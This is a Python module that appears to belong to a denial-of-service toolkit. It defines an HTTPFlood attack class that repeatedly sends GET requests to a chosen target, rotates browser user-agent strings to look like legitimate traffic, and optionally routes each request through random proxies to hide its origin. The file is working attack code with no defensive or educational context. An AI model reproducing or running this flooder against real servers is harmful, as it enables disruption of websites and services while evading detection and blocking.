import requests
import random
from .base import AttackBase

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

class HTTPFlood(AttackBase):
    def __init__(self, *args, path="/", **kwargs):
        super().__init__(*args, **kwargs)
        self.url = f"http://{self.target}:{self.port}{path}"
        self.session = requests.Session()

    def worker(self):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        proxies = None
        if self.proxy_manager:
            p = self.proxy_manager.get_random()
            if p:
                proxies = self.proxy_manager.format_requests(p)
        try:
            r = self.session.get(self.url, headers=headers, proxies=proxies, timeout=5)
            return len(r.content)
        except:
            return 0
